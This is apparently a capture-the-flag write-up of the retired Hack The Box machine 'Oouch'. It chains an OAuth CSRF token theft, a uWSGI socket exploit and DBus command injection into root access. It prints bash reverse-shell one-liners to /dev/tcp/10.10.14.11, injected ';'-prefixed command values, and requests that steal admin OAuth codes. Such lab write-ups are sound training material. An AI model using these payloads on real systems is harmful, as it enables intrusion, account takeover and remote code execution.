# Oouch

This is the write-up for the box Oouch that got retired at the 1st August 2020.
My IP address was 10.10.14.11 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.177    oouch.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/oouch.nmap 10.10.10.177
```

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            49 Feb 11  2020 project.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.11
|      Logged in as ftp
|      TYPE: ASCII
|      Session bandwidth limit in byte/s is 30000
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)
|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)
5000/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-title: Welcome to Oouch
|_Requested resource was http://10.10.10.177:5000/login?next=%2F
8000/tcp open  rtsp
| fingerprint-strings:
|   FourOhFourRequest, GetRequest, HTTPOptions:
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   RTSPRequest:
|     RTSP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   SIPOptions:
|     SIP/2.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|_    <h1>Bad Request (400)</h1>
|_http-title: Site doesn't have a title (text/html).
(...)
```

Even though the scan shows RTSP on port 8000, it is probably HTTP based on the strings that Nmap used.

## Checking FTP (Port 21)

The FTP service can be accessed with _anonymous login_:
```
ftp 10.10.10.177
```

There is one file called _project.txt_ with the following content:
```
Flask -> Consumer
Django -> Authorization Server
```

It seems like that one of the HTTP ports is developed with Pythons **Flask** module and the other one with the **Django** module.
The terms _"Consumer"_ and _"Authorization Server"_ are often used when deploying the **OAuth Authentication Protocol**.

We have to enumerate port 5000 and 8000 to find out which is what service.

## Checking HTTP (Port 5000)

The web page forwards to _"/login?next=%2"_ and shows a login page where it is possible to login or register:

![Login page on HTTP](oouch_web-1.png)

After registering a user, signing in is possible and there are several menus:

![Welcome to Oouch](oouch_web-2.png)

On the _Profile_ is information of my user account and the _"Connected-Accounts"_ field shows, that there are no accounts connected.

The menu _Contact_ has an input field were a message can be sent.
After sending the request to a proxy tool like **Burpsuite**, we can see the data gets transmitted in the _textfield_ parameter:
```
POST /contact HTTP/1.1
Host: 10.10.10.177:5000
(...)

csrf_token=IjFhMmVkODE0MGU4ZjU2OTIwZDY0OTA4N2E5MGM1NTNiMTM3NzA3Mjci.YSEeaA.eoXI9Q6qt1V7hfBo0rCoxHtX98U&textfield=test1&submit=Send
```

Lets send a link and start a listener to see if the link gets clicked:
```
(...)textfield=http://10.10.14.11/test1
```

After a few seconds the listener on my IP on port 80 gets a connection:
```
Ncat: Connection from 10.10.10.177.
Ncat: Connection from 10.10.10.177:38416.
GET /test1 HTTP/1.1
Host: 10.10.14.11
User-Agent: python-requests/2.21.0
```

This functionality could be useful later.

After searching for hidden directories and guessing that this has something to do with **OAuth**, the directory _/oauth_ can be found:

![OAuth Endpoint](oouch_web-3.png)

The hostname _consumer.oouch.htb_ has to be put into the _/etc/hosts_ file to access it.

### Analyzing the OAuth Login

When clicking on the first link to connect to the Oouch Authorization server, it forwards to the login page from before but has different parameters in the URL:
```
/login?next=%2Foauth%2Fconnect
```

After login with the same credentials as before, it responds with a HTTP status code _500 Internal Server Error_.
When sending the request to **Burpsuite**, we can see that it wants to forward to _authorization.oouch.htb_, so that has to put into the _/etc/hosts_ file.

Now the forwarding works and we get the login page on _authorization.oouch.htb:8000_:

![Authorization Server](oouch_web-4.png)

As no credentials were found yet, we can _Register_ an account.
After signing up, the login works and forwards to _/home_ with the following options:

![Home of Authorization](oouch_web-5.png)

The page _/authorize_ forwards to an error page:
```
Error: invalid_request

Missing client_id parameter.
```

The page _/token_ forwards to a blank page, so lets analyze this with **Burpsuite**.

The response is the HTTP status code _405 Method Not Allowed_ so instead we can send a POST request.
With a POST request, it responds with the HTTP status code _400 Bad Request_ and also shows an error:
```
"error": "unsupported_grant_type"
```

The [documentation of OAuth for Grant Types](https://oauth.net/2/grant-types/) shows which valid _grant_types_ exist and by choosing _Authorization Code_, it shows a different error:
```
POST /oauth/token/ HTTP/1.1
Host: authorization.oouch.htb:8000
(...)
grant_type=authorization_code
```
```
"error": "invalid_request",
"error_description": "Missing code parameter."
```

Sending any _code parameter_:
```
grant_type=authorization_code&code=anything
```
```
"error": "invalid_client"
```

The client will be some kind of username and password, but as it is mapped to applications, it will be more like a client ID and client secret.
As this is information is not found yet, there is nothing more to do here for now.

When going back to _consumer.oouch.htb:5000/oauth_ and follow the link to _consumer.oouch.htb:5000/oauth/connect_, it will ask if the Oouch-Consumer should be authorized:

![Authorize Oouch-Consumer](oouch_web-6.png)

In the request a client ID can be found:
```
client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82
response_type=code
redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read
```

This POST request has data in the URL and sends data. Some of it is doubled, but there is one parameter that is empty:
```
POST /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read HTTP/1.1
Host: authorization.oouch.htb:8000
(...)

csrfmiddlewaretoken=5fQg4ZHpc9ux5gaveSgl1ZddvWCheaaUz2dBbeHcncT6nSjUzum2bQL56WCr5D3O&redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken&scope=read&client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&state=&response_type=code&allow=Authorize
```

The parameter _state_ is empty, which is a vulnerability that allows to use a token for something else that it is not.
After authorizing, it forwards to _/profile_ and shows that there is now an entry on _Connected-Accounts_.

By repeating the workflow and authorizing again by clicking the link, it will show us the token in the GET request:
```
GET /oauth/connect/token?code=0YbvZ56PVc90ZMFVyORRMn0TQw6sfV
Host: consumer.oouch.htb:5000
```

Because there is no _state_, if any other user accesses this path, it will be possible to get access to their account.
We can now abuse the _Contact_ form as seen before so the link to this token gets clicked and grants us access to the user that clicked:
```
textfield=http://consumer.oouch.htb:5000/oauth/connect/token?code=0YbvZ56PVc90ZMFVyORRMn0TQw6sfV
```

![Sending Authorization request](oouch_web-7.png)

After a while the link gets clicked and the _Profile_ shows that no accounts are connected.
When authorizing to the account again at _consumer.oouch.htb:5000/oauth/login_ and browse to the _Profile_, it will be the account of the user that clicked the link that we sent:

![Becoming another user](oouch_web-8.png)

We now gained access to the account of _qtc_ by abusing this vulnerability.

### Enumerating with Admin Access

This user has some notes in the _Documents_ menu:
```
- dev_access.txt
  - develop:supermegasecureklarabubu123! -> Allows application registration.

- o_auth_notes.txt
  - /api/get_user -> user data.
  - oauth/authorize -> Now also supports GET method.

- todo.txt
  - Chris mentioned all users could obtain my ssh key. Must be a joke...
```

When trying the path _/api/get_user_ on both sites, it responds back on _authorization.oouch.htb:8000_ with a HTTP status code _403 Forbidden_.

In the documentation for the **Django OAuth Toolkit** it explains [Application Views](https://django-oauth-toolkit.readthedocs.io/en/latest/views/application.html) which can be found on the path _/applications/register_ to register applications and this path exists on the Authorization Server:
```
authorization.oouch.htb:8000/oauth/applications/register/
```

It asks for credentials and the ones from the notes work and forwards to a page where a new application can be registered:

![Register a new application](oouch_web-9.png)

Registering a new application:
```
Name: NewApplication1
Client id: tTdeI8itA27onSiDT0EjbHgA6U9XFmtAICQK8MdT
Client secret: Ns3Eor3WI6zFQ1LaYidD78hsFtBh0zYTx9lGNy9zbISZXz6Qi5IAZCafFyfjRn5zAaSU4cACpgr3CWrLf766wNee2hnvk0HPQlffsF6zTa9BTqHS7UBnGMkTC1VQuFPa
Client type: Public
Authorization grant type: Authorization code
Redirect uris: http://10.10.14.11/token
```

Authorizing user _qtc_ to our application with _consumer.oouch.htb:5000/oauth/connect_:
```
- Change POST to GET method
- Change client_id parameter to the new one
- Change redirect_uri to own server
```
```
GET /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&scope=read&redirect_uri=http://10.10.14.11/token&scope=read&client_id=tTdeI8itA27onSiDT0EjbHgA6U9XFmtAICQK8MdT&state=&response_type=code&allow=Authorize HTTP/1.1
Host: authorization.oouch.htb:8000
(...)
```

Sending the request to the Admin as a message:
```
http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&scope=read&redirect_uri=http://10.10.14.11/token&scope=read&client_id=tTdeI8itA27onSiDT0EjbHgA6U9XFmtAICQK8MdT&state=&response_type=code&allow=Authorize
```

![Sending authorization message](oouch_web-10.png)

After a while the listener receives the token of the admin:
```
Ncat: Connection from 10.10.10.177.
Ncat: Connection from 10.10.10.177:36968.
GET /token?code=AHMhiCtveS3Xc72YCgKyRtv24dloGu HTTP/1.1
Host: 10.10.14.11
User-Agent: python-requests/2.21.0
(...)
```

This token can be used on the _authorization.oouch.htb:8000/oauth/token/_ page:
```
- Change request method from GET to POST
- Add parameter grant_type to authorization_code
- Add parameter code as the received token
- Add parameter client_id to the Client ID of our application
```
```
POST /oauth/token/ HTTP/1.1
Host: authorization.oouch.htb:8000
(...)
grant_type=authorization_code&code=AHMhiCtveS3Xc72YCgKyRtv24dloGu&client_id=tTdeI8itA27onSiDT0EjbHgA6U9XFmtAICQK8MdT
```

The response is the _access_token_ that is valid for 10 minutes and can be used to gain access to the application:
```
{
"access_token": "mwITwshqJr8HPV3zeHSRnatgQE65VP",
"expires_in": 600,
"token_type": "Bearer",
"scope": "read",
"refresh_token": "PCRiQpx0oYszD2UqsURUtJot1vr24U"
}
```

The application were this can be used is the API on _authorization.oouch.htb:8000/api/get_user_:
```
curl authorization.oouch.htb:8000/api/get_user -H 'Authorization: Bearer mwITwshqJr8HPV3zeHSRnatgQE65VP'
```
```
{"username": "qtc", "firstname": "", "lastname": "", "email": "qtc@nonexistend.nonono"}
```

Now it is possible to enumerate the API for 10 minutes.
If the token runs out, a new one has to be created the same way as before.

One of the notes said, that there is a SSH key to be found so lets try _get_ssh_:
```
curl authorization.oouch.htb:8000/api/get_ssh -H 'Authorization: Bearer mwITwshqJr8HPV3zeHSRnatgQE65VP'
```
```
{
"ssh_server": "consumer.oouch.htb",
"ssh_user": "qtc",
"ssh_key": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAA
(...)"
}
```

To get the SSH key into the right format, the tool **jq** can be used:
```
curl -s authorization.oouch.htb:8000/api/get_ssh -H 'Authorization: Bearer tf9hVpNVXTZwd2MCc8f9j6An8XuMdc' | jq .ssh_key -r > ssh.key
```

This key can now be used to SSH into the box as the user _qtc_:
```
chmod 600 ssh.key

ssh -i ssh.key qtc@10.10.10.177
```

## Privilege Escalation

In the home directory of _qtc_ is a hidden file called _.note.txt_ with the following text:
```
Implementing an IPS using DBus and iptables == Genius?
```

The acronym IPS stands for **Intrusion Prevention System** and **DBus** is a technology that allows communication between multiple processes running concurrently on the same machine.
So in this case, it probably allows that the web application communicates with **iptables**.

Searching for DBus configuration files:
```
find /etc -type f 2>/dev/null | grep -i dbus
```

The configuration file _/etc/dbus-1/system.d/htb.oouch.Block.conf_ shows that the user _www-data_ is allowed to send and receive connections, but this user does not exist in the _/etc/passwd_ file.

By looking at the interfaces, there is one called _docker0_ which means, that this is a **Docker container**:
```
docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default
   link/ether 02:42:51:f0:27:64 brd ff:ff:ff:ff:ff:ff
   inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0

br-a3f2eee8f2e3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
   link/ether 02:42:8e:5d:49:7d brd ff:ff:ff:ff:ff:ff
   inet 172.18.0.1/16 brd 172.18.255.255 scope global br-a3f2eee8f2e3
```

### Enumerating the Container Networks

When searching for the _project.txt_ file from the FTP service, it can be found on this container:
```
find / . 2>/dev/null | grep project.txt
```
```
/opt/ftproot/project.txt
```

Enumerating the networks to find containers:
```bash
for i in $(seq 1 10); do
        ping -W 1 -c 1 172.18.0.$i > /dev/null && echo "Host Alive: 172.18.0.$i" || echo "Host Dead: 172.18.0.$i"
done
```
```
Host Alive: 172.18.0.1
Host Alive: 172.18.0.2
Host Alive: 172.18.0.3
Host Alive: 172.18.0.4
Host Alive: 172.18.0.5
```

By pinging through both networks, there are 4 more IPs that respond in the _172.18.0.1/16_ network.
Scanning for SSH on the alive hosts:
```bash
for i in $(seq 1 5); do
        echo "test" 2>/dev/null > /dev/tcp/172.18.0.$i/22 && echo "SSH Alive: 172.18.0.$i" || echo "SSH Dead: 172.18.0.$i"
done
```
```
SSH Alive: 172.18.0.1
SSH Dead: 172.18.0.2
SSH Dead: 172.18.0.3
SSH Dead: 172.18.0.4
SSH Alive: 172.18.0.5
```

Checking where port 5000 and port 8000 respond:
```
(...)
curl 172.18.0.4:5000
curl 172.18.0.5:5000

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
(...)
```
```
(...)
curl 172.18.0.4:8000

<h1>Bad Request (400)</h1>
```

Summary of the found hosts:
- 172.18.0.1 --> FTP (Port 21)
- 172.18.0.2 --> ?
- 172.18.0.3 --> ?
- 172.18.0.4 --> Django (Port 8000)
- 172.18.0.5 --> Flask (Port 5000)

As SSH responds back on _172.18.0.5_, maybe the SSH key from before will work to get there:
```
ssh 172.18.0.5
```

It works and gives SSH access to the **Flask Consumer** container.

### Enumerating Flask Container

The code for the Flask application is in _/code_ and after going through the files, the file _/code/oouch/templates/hacker.html_ can be found, which is responsible for showing a blocking message:
```
(...)
Dear hacker, did we not already told you, that this site is constructed following the highest security standards
Well, we blocked your IP address for about one minute and hope that you learn something from that.
(...)
```

Searching where _hacker.html_ is referenced, to analyze the code:
```
grep /code -R hacker.html . 2>/dev/null
```

Only the file _oouch/routes.py_ references _hacker.html_ and uses the **dbus Python module** to implement the blocking:
```python
# (...)
# First apply our primitive xss filter
if primitive_xss.search(form.textfield.data):
  bus = dbus.SystemBus()
  block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
  block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

  client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
  response = block_iface.Block(client_ip)
  bus.close()
  return render_template('hacker.html', title='Hacker')
# (...)
```

By running the code line by line in the **Python commandline**, command execution can be tested:
```
>>> import dbus
>>> bus = dbus.SystemBus()
>>> block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
>>> block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

>>> runme = '; ping -c 1 10.10.14.11 #'
>>> response = block_iface.Block(runme)
```

> NOTE: Switch directory to _/usr/lib/python3/dist-packages/_ to be able to import dbus

It shows and error that access is denied, so the _www-data_ user is needed to abuse **Dbus**:
```
(...)
dbus.exceptions.DBusException: org.freedesktop.DBus.Error.AccessDenied: Rejected send message
```

### Privilege Escalation to www-data

In the _/code_ directory is a file called _uwsgi.ini_ which means that [uWSGI](https://uwsgi-docs.readthedocs.io/en/latest/) is used as a Gateway Interface so the Python applications use it to send data to the web server which is **nginx** in this case.
The configuration for this can be found in the _/etc/nginx/nginx.conf_ file.

There is public [exploit code on GitHub for uWSGI](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py) that can be tried out.
Pasting the source code into a file:
```
cat <<EOF > uwsgi_exp.py
```

Executing the exploit:
```
python uwsgi_exp.py -m unix -u /tmp/uwsgi.socket -c 'bash -c "bash -i >& /dev/tcp/10.10.14.11/9001 0>&1"'
```

> NOTE: The exploit wants to import the _bytes_ module, so the lines where it is imported should be removed:

```
sed '/import b/d' uwsgi_exp.py -i
```

After sending the command, the listener on my IP and port 9001 starts a reverse shell sessions as _www-data_ on the **Flask container**.

#### Exploiting DBus with www-data

Running the commands again to get command execution with **Dbus**:
```
>>> import dbus
>>> bus = dbus.SystemBus()
>>> block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
>>> block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

>>> runme = '; ping -c 1 10.10.14.11 #'
>>> response = block_iface.Block(runme)
```

It works and my `tcpdump` listener gets a response back and command execution is proofed.
Lets execute a reverse shell command:
```
>>> runme = "; bash -c 'bash -i >& /dev/tcp/10.10.14.11/9002 0>&1 #'"
>>> response = block_iface.Block(runme)
```

After sending the command, the listener on my IP and port 9002 stars a reverse shell as root!
